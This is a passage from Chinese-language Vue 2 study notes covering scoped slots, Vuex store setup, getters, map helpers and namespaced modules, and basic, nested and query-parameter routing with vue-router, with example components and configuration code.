##### 效果四（作用域插槽）：

↓ Category.vue：

```vue
<template>
  <div id="Category">
    <h3>{{ title }}分类</h3>
    <!-- 通过slot标签传递的数据传给了该插槽的使用者 -->
    <slot :games="games" :msg="msg">我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
  </div>
</template>

<script>
export default {
  name: "Category",
  props: ["title"],
  // 数据从App组件中迁移到Category组件
  data() {
    return {
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      msg: 'hello'
    };
  },
};
</script>

<style scoped>
#Category {
  background-color: skyblue;
  width: 200px;
  height: 300px;
}
h3 {
  background-color: orange;
}
</style>
```

↓ App.vue：

```vue
<template>
  <div id="app">
    <Category title="游戏">
      <!-- 要想收到Category组件中插槽传过来的数据，必须使用template标签 -->
      <!-- scope属性的属性值任意，会接收所有来自插槽的数据封装为一个对象 -->
      <!-- 
        传递的数据(对象)：
        data：{
           "games": [ "红色警戒", "穿越火线", "劲舞团", "超级玛丽" ],
           "msg": 'hello'
        }
       -->
      <template scope="data">
        <ul>
          <li v-for="(game, index) in data.games" :key="index">{{ game }}</li>
        </ul>
      </template>
    </Category>

    <Category title="游戏">
      <!-- 此处的scope还可以写成slot-scope，作用相同，只不过这个是新的API写法 -->
      <template slot-scope="data">
        <ol>
          <li v-for="(game, index) in data.games" :key="index">{{ game }}</li>
        </ol>
        <!--  -->
        <h4>{{ data.msg }}</h4>
      </template>
    </Category>

    <Category title="游戏">
      <!-- 此处支持ES6中的解构赋值 -->
      <template slot-scope="{ games }">
        <h4 v-for="(game, index) in games" :key="index">{{ game }}</h4>
      </template>
    </Category>
  </div>
</template>

<script>
import Category from "./components/Category.vue";
export default {
  name: "App",
  components: {
    Category,
  },
};
</script>

<style scoped>
#app {
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;

  display: flex;
  justify-content: space-around;
}
</style>
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9c978b03019213fde40e3c87dbb25f71.png#pic_center)

> 注意：自 2.6.0 起，scope已经弃用，用v-slot=""来获取

#### 4.4.1 理解

1. 作用：父组件向子组件传递带数据的标签，当一个组件有不确定的结构时, 就需要使用 slot 技术
2. 注意：插槽内容是在父组件中编译后, 再传递给子组件的

#### 4.4.2 分类

1. 默认插槽
    
2. 命名插槽
    
3. 作用域插槽
    

## 第 5 章：vuex

### 5.1 理解 vuex

#### 5.1.1 vuex 是什么

1. 概念：专门在Vue 中实现**集中式**状态（数据）管理的一个_Vue 插件_，对vue 应用中多个组件的**共享**状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。
    
2. Github 地址: https://github.com/vuejs/vuex
    

#### 5.1.2 什么时候使用 Vuex

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/38085e4c6be6d4ed2c515ffd2829254a.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/d765cf0a8a4e8521fdc2150bc8f7e456.png#pic_center)

1. 多个组件依赖于同一状态
    
2. 来自不同组件的行为需要变更同一状态
    

#### **5.1.3** 纯vue求和**案例**

```vue
<template>
  <div>
    <h1>当前求和为:{{ this.$store.state.sum }}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
      <option value="4">4</option>
      <option value="5">5</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="odds_add">当前和为奇数再加</button>
    <button @click="wait_add">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: "count",
  data() {
    return {
      n: 1, //下拉框选择的数
    };
  },
  methods: {
    increment() {
      // this.$store.dispatch("jia", this.n);
      this.$store.commit("JIA", this.n);
    },
    decrement() {
      this.$store.dispatch("jian", this.n);
    },
    odds_add() {
      // if (!this.$store.state.sum % 2) {
      //   this.$store.dispatch("jia", this.n);
      // }
      this.$store.dispatch("jian_odd", this.n);
    },
    wait_add() {
      // setInterval(() => {
      //   this.$store.dispatch("jia", this.n);
      //   console.log("我加了");
      // }, 5000);
      this.$store.dispatch("jian_wait", this.n);
    },
  },
};
</script>

<style>
* {
  margin: 2px;
}
</style>
```

#### **5.1.4** **Vuex** **工作原理图**

对应讲解视频P107：[https://www.bilibili.com/video/BV1Zy4y1K7SH/?p=107&share_source=copy_web&vd_source=a449648b71edb39b713d45bfac276bff](https://www.bilibili.com/video/BV1Zy4y1K7SH/?p=107&share_source=copy_web&vd_source=a449648b71edb39b713d45bfac276bff)

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6c1df7210d342550632bef330f60d30d.png#pic_center)

#### 5.1.5 搭建Vuex环境

1. 安装

注意：在2022年2月7日，vue3成为了默认版本，同时，vuex也更新到了4版本

如果执行npm i vuex，默认安装的是vuex4，只能在vue3中使用，在vue2中报错

因此，版本对应：（严格遵守版本规则）

- vue2—vuex3
- vue3—vuex4

如果已经下载了错误版本，则根据以下流程进行：

```cmd
npm i vuex  # 安装错误 
npm uninstall vuex  # 卸载 
npm install vuex@3  # 重新安装
```

2. 设置Vuex的store

- 两种形式：（二选一）
    
    - 创建**src/vuex/store.js（个人喜好）**或**src/store/index.js（官网推荐）**
        
    - js文件的内容都是一样的，该文件用于创建Vuex中最为核心的store
        
- ↓ 初次尝试：
    
    - index.js：
        
        ```js
        import Vuex from 'vuex'
        
        const actions = {}
        const mutations = {}
        const state = {}
        
        export default new Vuex.Store({
        	actions,
        	mutations,
        	state
        })
        ```
        
    - main.js：
        
        ```js
        import Vue from 'vue'
        import App from './App.vue'
        
        import vueResource from 'vue-resource'
        import Vuex from 'vuex'
        import store from './store'
        
        Vue.config.productionTip = false
        
        Vue.use(vueResource)
        Vue.use(Vuex)
        
        new Vue({
          render: h => h(App),
          store
        }).$mount('#app')
        ```
        
    - 结果报错：
        
        ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0344065c5f8475f8ee3de682a4c888b7.png#pic_center)
        
        > 意思是： 创建store【后】之前，必须先写Vue.use(vuex) 【先】这个代码
        
- 分析代码：
    
    - main.js第6行代码引入store模块
        
    - 马上来到index.js 文件，创建了store实例
        
    - 接着才继续执行 main.js 第七行开始的代码，包括第11行的Vue.use(Vuex) 代码
        
    
    ∴ 与报错提示的要求相反
    
- 再次尝试：
    
    main.js↓，更改代码顺序
    
    ```js
    ……
    Vue.use(Vuex)
    ……
    import store from './store'
    ……
    ```
    
    但是，报错依旧
    
- 真实情况原因：
    
    - 扫描了mian.js里面的所有代码，并先执行import部分，再按顺序执行的其他代码
- 解决：把Vue.use(Vuex)写在创建并暴露store之前
    
    - index.js：
        
        ```js
        //【该文件用于创建Vuex中最为核心的store】
        
        //引入Vue核心库
        import Vue from 'vue'
        //引入Vuex
        import Vuex from 'vuex'
        // 应用Vuex插件
        // 这行代码执行之后，创建Vue实例的时候就可以传入一个store配置项，vm和vc身上会有一个$store
        // !(页面报错提示)必须在创建store实例之前调用Vue.use(Vuex)
        Vue.use(Vuex)
        
        //准备actions对象——响应组件中用户的动作
        const actions = {}
        //准备mutations对象——修改state中的数据
        const mutations = {}
        //准备state对象——保存具体的数据
        const state = {}
        
        //创建并暴露store
        export default new Vuex.Store({
        	actions,
        	mutations,
        	state
        })
        ```
        
        main.js：
        
        ```js
        ……
        //引入store，如果创建的文件名是index.js，引入的路径中可以不用具体到文件名，默认就会找index.js
        // import store from './store/index'
        import store from './store'
        ……
        
        //创建vm
        //如果创建Vue实例时添加了自行定义的配置项，Vue会将这些自行定义的配置项扔掉
        new Vue({
        	el:'#app',
        	render: h => h(App),
        	store
        })
        ```
        

#### 5.1.6 vuex求和案例

↓ count.vue：

```vue
<template>
  <div>
    <h1>当前求和为:{{ this.$store.state.sum }}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
      <option value="4">4</option>
      <option value="5">5</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="odds_add">当前和为奇数再加</button>
    <button @click="wait_add">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: "count",
  data() {
    return {
      n: 1, //下拉框选择的数
    };
  },
  methods: {
    increment() {
      // this.$store.dispatch("jia", this.n);
      this.$store.commit("JIA", this.n);
    },
    decrement() {
      this.$store.dispatch("jian", this.n);
    },
    odds_add() {
      // if (!this.$store.state.sum % 2) {
      //   this.$store.dispatch("jia", this.n);
      // }
      this.$store.dispatch("jian_odd", this.n);
    },
    wait_add() {
      // setInterval(() => {
      //   this.$store.dispatch("jia", this.n);
      //   console.log("我加了");
      // }, 5000);
      this.$store.dispatch("jian_wait", this.n);
    },
  },
};
</script>

<style>
* {
  margin: 2px;
}
</style>
```

↓ router/index.js：

```js
//引入Vue核心库
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
// 应用Vuex插件
// 这行代码执行之后，创建Vue实例的时候就可以传入一个store配置项，vm和vc身上会有一个$store
// 必须在创建store实例之前调用Vue.use(Vuex)
Vue.use(Vuex)

//准备actions对象——响应组件中用户的动作
const actions = {
    jia: function (context, value) {
        console.log('action中的JIA被调用', context, value);
        context.commit('JIA', value)
    },
    jian: function (context, value) {
        console.log('action中的JIAN被调用', context, value);
        context.commit('JIAN', value)
    },
    jian_odd(context, value) {
        if (context.state.sum % 2 != 0) {
            console.log('action中的JIA被调用', context, value);
            context.commit('JIA', value)
        }
    },
    jian_wait(context, value) {
        setTimeout(() => {
            console.log('action中的JIA被调用', context, value);
            context.commit('JIA', value)
        }, 1000)
    }
}
//准备mutations对象——修改state中的数据
const mutations = {
    JIA(state, value) {
        console.log('mutation中的JIA被调用', state, value)
        state.sum += value
    },
    JIAN(state, value) {
        console.log('mutation中的JIAN被调用', state, value)
        state.sum -= value
    },

}
//准备state对象——保存具体的数据
const state = {
    sum: 0,
}

//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

开发者工具：（新旧版有区别）

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7a42b394307a57528073ae8b4f09918e.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/b38093786adf1f22d248e1afe4eb967d.png#pic_center)

#### 5.1.7 getters配置项

1. 概念：getters配置项并不是必须要使用的，当state中的数据需要经过加工后再使用时，可以使用getters加工。
    
2. 应用场景：运算逻辑复杂而且需要复用，用于抽取基于state中数据的公共运算
    
3. 在`store.js`中追加`getters`配置
    
    ```js
    ......
    // 准备getters——用于加工state中的数据
    const getters = {
        // state：真正的state
    	calculate(state){
            // 靠返回值决定自己的值
    		return state.sum * 10
    	}
    }
    
    //创建并暴露store
    export default new Vuex.Store({
    	......
        // 在store中配置getters
    	getters
    })
    ```
    
4. 模板中读取数据：`$store.getters.calculate`
    
    ```vue
    <!-- <h1>当前求和放大10倍为:{{ this.$store.state.sum *10 }}</h1> -->
    <h1>当前求和放大10倍为:{{ this.$store.getters.calculate }}</h1>
    ```
    
5. 注意：
    
    - Vuex中state和getters的关系就类似于Vue中data和computed的关系，state和data是数据源头，getters和computed是拿着数据源头的数据进行的加工。
    - 计算属性是当前组件复用复杂运算，getters是跨组件复用复杂运算

#### 5.1.8 四个map方法的使用

##### mapState 和 mapGetters

router/index.js：

```js
const state = {
    sum: 0,
    school:'尚硅谷',
    subject:'前端'
}
```

count.vue：

```vue
<template>
    <h1>当前求和为:{{ this.$store.state.sum }}</h1>
    <h1>当前求和放大10倍为:{{ this.$store.getters.calculate }}</h1>
    <h1>我在--{{ this.$store.state.school }}，学习--{{ this.$store.state.subject }}</h1>
</template>
```

总是在写：`this.$store.state.XXX`或者`this.$store.getters.XXX` 去获取数据，代码冗余很麻烦

↓ count.vue：

```vue
<template>
    <h1>当前求和为:{{ sum }}</h1>
    <h1>当前求和放大10倍为:{{ calculate }}</h1>
    <h1>我在--{{ school }}，学习--{{ subject }}</h1>
</template>
<script>
    export default{
        name:'count',
        computed: {
            sum() {
              return this.$store.state.sum;
            },
            calculate() {
              return this.$store.getters.calculate;
            },
            school() {
              return this.$store.state.school;
            },
            subject() {
              return this.$store.state.subject;
            },
          },
    }
</script>
```

计算属性优化了模板中的语法，使得插值语法变得简洁，但仍然没有解决代码冗余的问题，只是将插值语法中的冗余转移到了计算属性中

此时，引入map方法使用，cout.vue 代码如下：

```vue
<script>
import { mapState } from 'vuex';
import { mapGetters } from "vuex";
    
export default {
  name: 'count',
  computed: {
    ...mapState(["sum", "school", "subject"]),
    // 对象写法
    // ...mapState({
    //   sum: state => state.sum,
    //   school: state => state.school,
    //   subject: state => state.subject
    // }),
    // ...mapGetters({
    //   calculate: getters=> getters.calculate
    // }),
      
    // 数组写法（简写，属性名与读取名相同）
    ...mapState(["sum", "school", "subject"]),
    ...mapGetters(['calculate']),
  }
};
</script>
```

##### **mapActions** 和 **mapMutations**

count.vue：

```vue
<template>
  <div>
    <h1>当前求和为:{{ this.$store.state.sum }}</h1>
    <!-- <h1>当前求和放大10倍为:{{ this.$store.state.sum *10 }}</h1> -->
    <h1>当前求和放大10倍为:{{ this.$store.getters.calculate }}</h1>
    <h1>
      我在--{{ this.$store.state.school }}，学习--{{
        this.$store.state.subject
      }}
    </h1>

    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
      <option value="4">4</option>
      <option value="5">5</option>
    </select>
    <!-- 记得传参 -->
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="odds_add(n)">当前和为奇数再加</button>
    <button @click="wait_add(n)">等一等再加</button>
  </div>
</template>

<script>
    import { mapActions } from "vuex";
	import { mapMutations } from "vuex";
    export default {
      name: "count",
      data() {
        return {
          n: 1, //下拉框选择的数
        };
      },
      methods: {
      //靠mapActions生成：odds_add、wait_add（对象形式）
      ...mapActions({ odds_add: "jia_odd", wait_add: "jia_wait" }),
      //靠mapActions生成：odds_add、wait_add（数组形式）
      // ...mapActions(['jia_odd','jia_wait']),
	//==================================================
      //靠mapActions生成：increment、decrement（对象形式）
      ...mapMutations({ increment: "JIA", decrement: "JIAN" }),
      //靠mapMutations生成：JIA、JIAN（对象形式）
      // ...mapMutations(['JIA','JIAN']),
  },
};
</script>
```

注意：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件（event）对象

#### 5.1.9 多组件共享数据

↓ person.vue：

```vue
<template>
  <div class="person">
    <h1>人员列表</h1>
    <input placeholder="请输入名字" type="text" v-model="name">
    <button @click="add">添加</button>
    <ul>
        <li v-for="person in personList" :key="person.id">{{person.name}}</li>
    </ul>
    <h1 style="color: cadetblue;">另一个组件count的总数sum为：{{ sum }}</h1>
  </div>
</template>

<script>
import { nanoid } from 'nanoid'
import {mapState} from 'vuex'
export default {
    name: "person",
    data(){
        return {
            name:''
        }
    },
    computed:{
        // personList(){
        //     return this.$store.state.personList
        // }
        ...mapState(['personList','sum']),
    },
    methods:{
        add(){
            const personObj={
                id:nanoid(),
                name:this.name
            }
            // console.log(personObj)
            this.$store.commit('ADD_PERSON',personObj)
            this.name=''
            
        }
    }
};
</script>

<style>
</style>
```

↓ router/index.js：

```js
import Vue from 'vue'
import Vuex from 'vuex'
Vue.use(Vuex)

const actions = {
    ……
}
const mutations = {
   ……
    ADD_PERSON(state,value){
        console.log('mutation中的ADD_PERSON被调用', state, value)
        state.personList.unshift(value)
    }
}
//准备state对象——保存具体的数据
const state = {
    sum: 0,
    school:'尚硅谷',
    subject:'前端',
    personList:[
        {id:'001',name:'小黄'},
    ]
}

const getters = {
    ……
}

//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

↓ count.vue：

```vue
<template>
  <div>
    ……
      <h1 style="color: cadetblue;">另一个组件person的总人数为：{{ personList.length }}</h1>
      <!-- 使用 -->
    ……
  </div>
</template>

<script>
import { mapState,mapGetters,mapActions,mapMutations } from "vuex";

export default {
  name: "count",
  data() {
    return {
      n: 1, //下拉框选择的数
    };
  },
  computed: {
    ...mapState(["sum", "school", "subject",'personList']),//多引入一个数据
    ...mapGetters(["calculate"]),
  },
  methods: {
    ...mapActions({ odds_add: "jia_odd", wait_add: "jia_wait" }),
    ...mapMutations({ increment: "JIA", decrement: "JIAN" }),
  },
};
</script>
```

#### 5.1.10 vuex模块化

##### 命名空间（namespaced）

​ 命名空间（namespaced）是一个用于模块化的功能，它允许你将不同的 Vuex 模块分开，每个模块都有自己的状态、动作、突变和获取器。使用命名空间可以避免不同模块之间的状态和动作的命名冲突，并提高代码的可维护性

↓ router/index.js：

```js
import Vue from 'vue'
import Vuex from 'vuex'
Vue.use(Vuex)

// 计算求和相关的配置
const countOption = {
    namespaced: true,
    state: {
        sum: 0,
        school: '尚硅谷',
        subject: '前端',
    },
    actions: {
        jia: function (context, value) {
            console.log('action中的JIA被调用', context, value);
            context.commit('JIA', value)
        },
        jian: function (context, value) {
            console.log('action中的JIAN被调用', context, value);
            context.commit('JIAN', value)
        },
        jia_odd(context, value) {
            if (context.state.sum % 2 != 0) {
                console.log('action中的JIA被调用', context, value);
                context.commit('JIA', value)
            }
        },
        jia_wait(context, value) {
            setTimeout(() => {
                console.log('action中的JIA被调用', context, value);
                context.commit('JIA', value)
            }, 1000)
        }
    },
    mutations: {
        JIA(state, value) {
            console.log('mutation中的JIA被调用', state, value)
            state.sum += value
        },
        JIAN(state, value) {
            console.log('mutation中的JIAN被调用', state, value)
            state.sum -= value
        },
    },
    getters: {
        calculate(state) {
            return state.sum * 10
        }
    }
}
// 人员管理相关的配置
const personOption = {
    namespaced: true,
    state: {
        personList: [
            { id: '001', name: '小黄' },
        ]
    },
    actions: {
        addPersonWang(context,value){
            if(value.name.indexOf('王')===0){
                context.commit('ADD_PERSON',value)
            }else{
                alert('添加的人必须是姓王的')
            }
        }
    },
    mutations: {
        ADD_PERSON(state, personObj) {
            console.log('mutation中的ADD_PERSON被调用', state, personObj)
            state.personList.unshift(personObj)
        }
    },
    getters: {
        firstPersonName(state){
            return state.personList[0].name
        }
    }
}

export default new Vuex.Store({
    modules:{
        countAbout: countOption,
        personAbout: personOption
    }
})
```

↓ count.vue：

```vue
<template>
  ……
</template>

<script>
import { mapState,mapGetters,mapActions,mapMutations } from "vuex";

export default {
  name: "count",
  data() {
    return {
      n: 1, 
    };
  },
  computed: {
    ...mapState('countAbout',["sum", "school", "subject"]),
    ...mapState('personAbout',["personList"]),
    ...mapGetters('countAbout',["calculate"]),
  },
  methods: {
    ...mapActions('countAbout',{ odds_add: "jia_odd", wait_add: "jia_wait" }),
    ...mapMutations('countAbout',{ increment: "JIA", decrement: "JIAN" }),
  },
};
</script>
```

↓ person.vue：

```vue
<template>
  <div class="person">
    <h1>人员列表</h1>
    <h2>列表中的一个人的名字是：{{ firstPersonName }}</h2>
    <input placeholder="请输入名字" type="text" v-model="name">
    <button @click="add">添加</button>
    <button @click="addPersonWang">添加一个姓王的人</button>
    <ul>
        <li v-for="person in personList" :key="person.id">{{person.name}}</li>
    </ul>
    <h2 style="color: cadetblue;">另一个组件count的总数sum为：{{ sum }}</h2>
  </div>
</template>

<script>
import { nanoid } from 'nanoid'
import {mapState} from 'vuex'
export default {
    name: "person",
    data(){
        return {
            name:'',
        }
    },
    computed:{
        personList(){
            // 注意这里！！！
            return this.$store.state.personAbout.personList
        },
        ...mapState('countAbout',['sum']),

        firstPersonName(){
            return this.$store.getters['personAbout/firstPersonName']
        }
    },
    methods:{
        add(){
            const personObj={
                id:nanoid(),
                name:this.name
            }
            // console.log(personObj)
            // 注意这里！！！需要前面加上模块名称
            this.$store.commit('personAbout/ADD_PERSON',personObj)
            this.name=''
        },
        addPersonWang(){
            const personObj={
                id:nanoid(),
                name:this.name
            }
            this.$store.dispatch('personAbout/addPersonWang',personObj)
            this.name=''
        }
    }
};
</script>

<style>
</style>
```

除此之外，index.js中拆分出来的各个模块可以都独立为一个一个的单独的配置文件，增强可维护性

分别为 store/count.js和store/person.js

```js
// 计算求和相关的配置
export default {
    namespaced: true,
    state: {
        sum: 0,
        school: '尚硅谷',
        subject: '前端',
    },
    actions: {
        jia: function (context, value) {
            console.log('action中的JIA被调用', context, value);
            context.commit('JIA', value)
        },
        jian: function (context, value) {
            console.log('action中的JIAN被调用', context, value);
            context.commit('JIAN', value)
        },
        jia_odd(context, value) {
            if (context.state.sum % 2 != 0) {
                console.log('action中的JIA被调用', context, value);
                context.commit('JIA', value)
            }
        },
        jia_wait(context, value) {
            setTimeout(() => {
                console.log('action中的JIA被调用', context, value);
                context.commit('JIA', value)
            }, 1000)
        }
    },
    mutations: {
        JIA(state, value) {
            console.log('mutation中的JIA被调用', state, value)
            state.sum += value
        },
        JIAN(state, value) {
            console.log('mutation中的JIAN被调用', state, value)
            state.sum -= value
        },
    },
    getters: {
        calculate(state) {
            return state.sum * 10
        }
    }
}
```

```js
// 人员管理相关的配置
const personOption = {
    namespaced: true,
    state: {
        personList: [
            { id: '001', name: '小黄' },
        ]
    },
    actions: {
        addPersonWang(context,value){
            if(value.name.indexOf('王')===0){
                context.commit('ADD_PERSON',value)
            }else{
                alert('添加的人必须是姓王的')
            }
        }
    },
    mutations: {
        ADD_PERSON(state, personObj) {
            console.log('mutation中的ADD_PERSON被调用', state, personObj)
            state.personList.unshift(personObj)
        }
    },
    getters: {
        firstPersonName(state){
            return state.personList[0].name
        }
    }
}
export default personOption
```

在 router/index.js中引入并使用

```js
import countOption from './count'
import personOption from './person'
……
export default new Vuex.Store({
    modules: {
        countAbout: countOption,
        personAbout: personOption
    }
})
```

### 5.2 vuex 核心概念和 API

#### **5.2.1** **state**

1. vuex 管理的状态对象，包含了应用的各种状态数据
    
2. 它应该是唯一的，通常在根模块中定义，并作为其他模块的根状态
    

#### 5.2.2 actions

1. 值为一个对象，包含多个响应用户动作的回调函数
    
2. 通过commit( )来触发mutation 中函数的调用, 间接更新state
    
3. 如何触发actions 中的回调？
    
    在组件中使用: **$store.dispatch(对应的action 回调名)** 触发
    
4. 可以包含异步代码（定时器, ajax 等等）
    

#### 5.2.3 mutations

1. 值是一个对象，包含多个直接更新state 的方法
    
2. 谁能调用mutations 中的方法？如何调用？
    
    在action 中使用：**commit('对应的 mutations 方法名**) 触发
    
3. mutations 中方法的特点：不能写异步代码、只能单纯的操作state
    

#### 5.2.4 getters

1. 值为一个对象，包含多个用于返回数据的函数
    
2. 如何使用？—— **$store.getters.xxx**
    
3. getters 通常用于对 state 数据进行加工，以返回更有用的数据
    

#### 5.2.5 modules

1. modules 是一个包含多个 module 的对象
    
2. 一个 module 是一个 store 的配置对象，它包含了自己的 state、mutations、actions 和 getters
    
3. 每个 module 通常与一个组件（包含有共享数据）对应，它们之间可以通过命名空间进行隔离
    

## 第 6 章：vue-router

### 6.1 相关理解

联系实际：![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/4a941c0ac367bdff9c2a93100532b8f1.png#pic_center)

#### 6.1.1 vue-router 的理解

- vue 的一个**插件库**，专门用来实现SPA应用

#### 6.1.2 对SPA 应用的理解

1. 单页Web 应用（**s**ingle **p**age **w**eb **a**pplication，**SPA**）
    
2. 整个应用只有**一个完整的页面**
    
3. 点击页面中的导航链接**不会刷新**页面，只会做页面的**局部更新**
    
4. 数据需要通过ajax请求获取
    

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0f267635cdc5fa9c5b4ab5100d1240ea.png#pic_center)

导航区+展示区

1. **点击导航**： 用户点击 `<router-link>` 创建的链接。
2. **页面路径改变**： 浏览器的 URL 更新，但页面不刷新。
3. **展示内容更新**： `vue-router` 根据新的 URL 渲染对应的组件，并显示在 `<router-view>` 中，实现内容切换。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/d88b24eb1213e464c451d5067d7ba097.png#pic_center)

#### 6.1.3 路由的理解

###### 1. 什么是路由?

1. 一个路由就是一组映射关系（key - value）
    
2. key 为路径, value 可能是function 或component
    

###### 2. 路由分类

- 后端路由：
    
    1. 理解：value 是function, 用于处理客户端提交的请求
        
    2. 工作过程：服务器接收到一个请求时, 根据**请求路径**找到匹配的**函数**来处理请求, 返回响应数据
        
    
    Express.js 框架模拟：
    
    ```js
    const express = require('express')
    const app = express()
    
    app.use((request,response,next)=>{
    	console.log('有人请求服务器1了');
    	// console.log('请求来自于',request.get('Host'));
    	// console.log('请求的地址',request.url);
    	next()
    })
    
    //当请求路径为 /students 时，会调用对应的处理函数，该函数会返回一个学生JSON数组作为响应
    app.get('/students',(request,response)=>{
    	const students = [
    		{id:'001',name:'tom',age:18},
    		{id:'002',name:'jerry',age:19},
    		{id:'003',name:'tony',age:120},
    	]
    	response.send(students)
    })
    
    app.listen(5000,(err)=>{
    	if(!err) console.log('服务器1启动成功了,请求学生信息地址为：http://localhost:5000/students');
    })
    ```
    
- 前端路由：
    
    1. 理解：value 是component，用于展示页面内容
        
    2. 工作过程：当浏览器的路径改变时, 对应的组件就会显示
        

> 助记（不准确）：路由路由，由我决定展示哪个页面

### 6.2 基本路由

##### 1. 创建组件

About.vue：

```vue
<template>
  <div class="About">
    <h1>我是About</h1>
  </div>
</template>

<script>
export default {
    name:'About',
}
</script>

<style>
</style>
```

Home.vue：

```vue
<template>
  <div class="Home">
    <h1>我是Home</h1>
  </div>
</template>

<script>
export default {
    name:'Home',
}
</script>

<style>
</style>
```

##### 2. 设置路由

router文件夹 —> router.js：

```js
//两个引入：vue+vueRouter
import Vue from 'vue';
import Router from 'vue-router';
//引入路由组件
import Home from '@/components/Home.vue';
import About from '@/components/About.vue';
//vue使用vueRouter
Vue.use(Router);
//暴露创建
export default new Router({
  routes: [
    {
      path: '/Home',
      name: 'Home',
      component: Home
    },
    {
      path: '/about',
      name: 'About',
      component: About
    }
  ]
});
```

##### 3. 创建根组件

App.vue：

```vue
<template>
  <div id="app">
    <nav>
      <router-link to="/Home">Home</router-link>
      <br>
      <router-link to="/about">About</router-link>
    </nav>
    <router-view/>
  </div>
</template>

<script>

export default {
  name: 'App',
  components: {
  }
}
</script>

<style>
#app {
  text-align: center;
  margin-top: 60px;
}
</style>
```

##### 4. 启动应用

main.js：

```js
import Vue from 'vue';
import App from './App.vue';
import router from './router/router.js';

new Vue({
  router,
  render: h => h(App)
}).$mount('#app');
```

##### 页面展示：

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/00bfa0dbcb864a75741f438b156059d5.png#pic_center)

##### 注意事项：

1. 路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹
    
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载
    
    ```js
    export default {
        name:'XXX',
        mounted() {
          console.log('XXX挂载完毕',this);
        },
        beforeDestroy() {
          console.log('XXX即将被销毁');
        },
        destroyed() {
          console.log('XXX被销毁了');
        },
    }
    ```
    
    ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/cc7066bfe5d2ff2f9a4f5027d7cf2549.png#pic_center)
    
3. 每个组件都有自己的`$route`属性，里面存储着自己的路由信息
    
4. 整个应用只有一个router，可以通过组件的`$router`属性获取到
    

> 每个组件都带了`$router` 和 `$route` ，不一样的是 `$route` 是每个组件特有的，`$router` 都是一样的
> 
> ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8323e9fdb4ea037ea2baa656cb32b718.png#pic_center)

### **6.3** **嵌套（多级）路由**

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a6399110650d2ba9a220aa75ed1de6aa.png#pic_center)

分析页面：

App —Banner(component 不在路径显示)

​ —About

​ —Home —News

​ —Message

```js
routes:[
	{
		path:'/about',
		component:About,
	},
	{
		path:'/home',
		component:Home,
		children:[ //通过children配置子级路由
			{
				path:'news', //此处一定不要写：/news
				component:News
			},
			{
				path:'message', //此处一定不要写：/message
				component:Message
			}
		]
	}
]
```

### **6.4** **路由传参**

#### query参数

案例完整代码：

↓ /components/Banner.vue：

```vue
<template>
	<div class="col-xs-offset-2 col-xs-8">
		<div class="page-header"><h2>Vue Router Demo</h2></div>
	</div>
</template>

<script>
	export default {
		name:'Banner'
	}
</script>
```

↓ pages/About.vue：

```vue
<template>
	<h2>我是About的内容</h2>
</template>

<script>
	export default {
		name:'About',
	}
</script>
```

↓ pages/Home.vue：

```vue
<template>
  <div>
    <h2>Home组件内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link
            class="list-group-item"
            active-class="active"
            to="/home/news"
            >News</router-link
          >
        </li>
        <li>
          <router-link
            class="list-group-item"
            active-class="active"
            to="/home/message"
            >Message</router-link
          >
        </li>
      </ul>
      <router-view></router-view>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
};
</script>
```

↓ pages/News.vue：

```vue
<template>
	<ul>
		<li>news001</li>
		<li>news002</li>
		<li>news003</li>
	</ul>
</template>

<script>
	export default {
		name:'News'
	}
</script>
```

↓ pages/Message.vue：【重点】

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带query参数，to的字符串写法，模板字符串写法 -->
        <!-- <router-link 
			:to="`/home/message/detail?id=${m.id}&title=${m.title}`"
			>
			{{m.title}}
		</router-link>&nbsp;&nbsp; -->

        <!-- 跳转路由并携带query参数，to的对象写法 -->
        <router-link
          :to="{
            path: '/home/message/detail',
            query: {
              id: m.id,
              title: m.title,
            },
          }"
        >
          {{ m.title }}
        </router-link>
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>
```

↓ pages/Detail.vue：

```vue
<template>
	<ul>
		<li>消息编号：{{$route.query.id}}</li>
		<li>消息标题：{{$route.query.title}}</li>
	</ul>
